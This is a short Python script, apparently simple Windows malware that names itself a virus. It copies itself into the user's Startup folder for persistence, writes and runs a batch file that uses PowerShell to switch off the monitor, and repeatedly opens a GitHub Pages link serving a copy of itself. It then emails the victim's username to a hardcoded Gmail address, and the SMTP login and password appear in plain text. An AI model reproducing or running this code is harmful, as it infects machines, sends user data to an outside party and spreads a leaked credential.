import os
import shutil
import getpass
import subprocess
import smtplib as root
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

USER_NAME = getpass.getuser()
bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
my_pub = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows' % USER_NAME
def copyvirus():
    file_path = os.path.dirname(os.path.realpath(__file__))
    shutil.copyfile(r'%s\app.py' % file_path , r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\app.py' % USER_NAME)
copyvirus()
def offmon():
    with open(my_pub + '\\' + "offmon.bat", "w+") as bat_file:
        bat_file.write(r"C:\Windows\System32\cmd.exe /c powershell.exe (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)")
    os.system(my_pub +'\\' + 'offmon.bat')
def virus():
    offmon()
    os.system('start chrome https://sivertillya.github.io/db/app.py')
    os.system('start chrome https://sivertillya.github.io/db/app.py')
    os.system('start chrome https://sivertillya.github.io/db/app.py')
    # os.system('ping google.com')
    # os.system('ping google.com')
    # os.system('ping google.com')
    def send_mail():
        login = 'wolf.sivert@gmail.com'
        password = 'yfcnz27000'
        url = 'smtp.gmail.com'
        toaddr = 'wolf.sivert@gmail.com'
        topic = 'App.exe'
        message = USER_NAME

        msg = MIMEMultipart()

        msg[ 'Subject' ] = topic
        msg[ 'From' ] = login
        body = message
        msg.attach(MIMEText(body, 'plain'))

        server = root.SMTP_SSL(url, 465)
        server.login(login, password)
        server.sendmail(login, toaddr, msg.as_string())
    send_mail()
virus()
